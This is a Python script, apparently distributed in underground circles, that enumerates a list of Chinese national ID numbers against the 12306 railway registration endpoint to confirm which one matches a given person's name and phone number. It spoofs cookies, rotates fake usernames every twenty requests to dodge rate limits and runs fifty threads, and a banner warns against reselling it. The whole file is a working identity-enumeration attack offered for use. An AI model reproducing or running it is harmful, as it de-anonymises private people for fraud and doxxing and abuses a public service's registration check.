import requests
import time
import random
import re
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote



def get_12306_cookie():
#此接口不是市面上泛滥的
    try:
        home_url = "https://www.12306.cn/index/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36"
        }
        response = requests.get(home_url, headers=headers, timeout=10)
        
        # 提取或生成JSESSIONID
        jsessionid = response.cookies.get('JSESSIONID', f"JSESSIONID_{random.randint(10**9, 10**10-1)}")
        
        # 提取或生成BIGipServer值
        bigip_match = re.search(r'BIGipServerpool_index=(\d+\.\d+\.\d+\.\d+)', response.text)
        bigip_value = bigip_match.group(1) if bigip_match else f"BIGipServer_{random.randint(10**9, 10**10-1)}"
        
        # 构建Cookie（包含固定路由和日期参数）
        cookie_str = f"JSESSIONID={jsessionid}; BIGipServerpool_index={bigip_value}; " \
                     "route=6f50b51faa11b987e576cdb301e545c4; " \
                     "_jc_save_fromStation=%u5317%u4EAC%2CBJP; _jc_save_toStation=%u4E0A%u6D77%2CSHH; " \
                     f"_jc_save_fromDate={time.strftime('%Y-%m-%d')}; _jc_save_toDate={time.strftime('%Y-%m-%d')}; " \
                     "_jc_save_wfdc_flag=dc"
        
        return {"Cookie": cookie_str}
    
    except Exception as e:
        print(f"❌ 获取Cookie失败: {e}")
        return {"Cookie": "JSESSIONID=ABCDEF1234567890; BIGipServerpool_index=123.456.789.012; route=6f50b51faa11b987e576cdb301e545c4"}

def verify_single_id(id_no, mobile_no, real_name, lock, success_count, total, index, 
                     found_event, success_info, group_counter, group_username, group_cookie):
    """单条三要素核验函数"""
    if found_event.is_set():
        return  # 已找到有效数据则提前终止
    
    # 每20个身份证号更新一次用户名和Cookie（模拟不同用户请求）
    with lock:
        if group_counter[0] % 20 == 0 or group_username[0] is None:
            group_username[0] = "Hgyyr" + ''.join(random.choices('123456789', k=4))
            group_cookie[0] = get_12306_cookie()
            print(f"\n🔁 刷新验证参数: 用户名 {group_username[0]}, 即将验证第 {group_counter[0]+1}-{group_counter[0]+20} 条")
        group_counter[0] += 1
        current_username = group_username[0]
        current_cookie = group_cookie[0]
    
    # 核验接口参数
    url = "https://mobile.12306.cn/wxxcx/wechat/regist/getMobileCode"
    headers = {
        "Host": "mobile.12306.cn",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) MicroMessenger/8.0.59",
        "Referer": "https://servicewechat.com/wxa51f55ab3b2655b9/134/page-frame.html",
        **current_cookie  # 携带当前组Cookie
    }
    data = {
        "user_name": current_username,
        "password": "@JAYW8lFiY5u7DbqjW7uyRg==",  # 固定密码（模拟注册流程）
        "confirm_password": "@JAYW8lFiY5u7DbqjW7uyRg==",
        "name": real_name,
        "id_type_code": "1",  # 1代表身份证
        "id_no": id_no,
        "country_code": "CN",
        "email": "heianhajuyuebu@qq.com",  # 固定邮箱
        "mobile_no": mobile_no,
        "mobile_code": "86",
        "passenger_type": "1",  # 成人
        "sex_code": "M"  # 性别（模拟）
    }
    
    try:
        res = requests.post(url, headers=headers, data=data, timeout=10)
        res_text = res.text
        
        # 解析核验结果
        if "该证件号码已被注册" in res_text:
            result = f"{index}/{total}: {real_name}—{mobile_no}—{id_no} "
            with lock:
                success_count[0] += 1
                found_event.set()  # 标记已找到有效数据
                success_info.update({
                    "name": real_name,
                    "mobile": mobile_no,
                    "id": id_no
                })
        elif "手机号码已被其他注册用户使用" in res_text:
            result = f"{real_name}—{mobile_no}—{id_no} 手机号已注册"
        elif "用户未登录" in res_text or "未授权" in res_text:
            result = f"{real_name}—{mobile_no}—{id_no} ❌ Cookie失效，自动刷新中..."
            # 触发Cookie刷新（下一组请求会自动更新）
        else:
            result = f"{real_name}—{mobile_no}—{id_no} 🔴"
            
    except Exception as e:
        result = f"{real_name}—{mobile_no}—{id_no} ❌ 请求异常: {str(e)[:30]}"
    
    with lock:
        print(result)

def batch_verify_three_elements():
    """批量三要素核验主函数"""
    # 输入核验参数
    mobile_no = input("请输入手机号: ")
    real_name = input("请输入姓名: ")
    id_file_path = input("请输入身份证号文件: ")
    
    try:
        # 读取身份证号列表
        with open(id_file_path, 'r', encoding='utf-8') as f:
            id_numbers = [line.strip() for line in f if line.strip()]
        total = len(id_numbers)
        if total == 0:
            print("🔴：文件中无有效身份证号")
            return
        
        print(f"\n✅✅✅ 成功读取 {total} 个身份证号，开始核验...")
        
        # 初始化线程共享变量
        lock = threading.Lock()
        found_event = threading.Event()  # 找到有效数据时终止所有线程
        success_count = [0]  # 成功计数（列表类型用于线程共享）
        success_info = {"name": "", "mobile": "", "id": ""}  # 存储成功数据
        group_counter = [0]  # 组计数器（每20条一组）
        group_username = [None]  # 组用户名
        group_cookie = [None]  # 组Cookie
        
        # 记录开始时间
        start_time = time.time()
        
        # 创建线程池（最大线程数不超过50或总数据量）
        max_workers = min(50, total)
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for idx, id_no in enumerate(id_numbers, 1):
                if found_event.is_set():
                    break  # 已找到有效数据则不再提交新任务
                # 提交核验任务
                futures.append(executor.submit(
                    verify_single_id, 
                    id_no, mobile_no, real_name, lock, success_count, total, idx,
                    found_event, success_info, group_counter, group_username, group_cookie
                ))
            # 等待所有任务完成
            for future in futures:
                future.result()  # 捕获异常（虽然函数内已处理）
        
        # 输出核验结果
        elapsed_time = time.time() - start_time
        print(f"\n🎉 核验完成，耗时: {elapsed_time:.2f}秒")
        print(f"核验成功🟢: {success_count[0]}/{total} 条")
        
        # 显示有效数据详情
        if found_event.is_set():
            print(f"🔍 公安三要素🟢:")
            print(f"姓名: {success_info['name']}")
            print(f"手机号: {success_info['mobile']}")
            print(f"身份证号: {success_info['id']}")
            
    except FileNotFoundError:
        print(f"🔴 错误：文件 '{id_file_path}' 不存在")
    except Exception as e:
        print(f"❌ 核验过程出错: {e}")

if __name__ == "__main__":
    print("晴初nb666")
    print("说明：此批量三为晴初出品,如有倒卖外传等嫌疑导致接口死概不负责")
    batch_verify_three_elements()
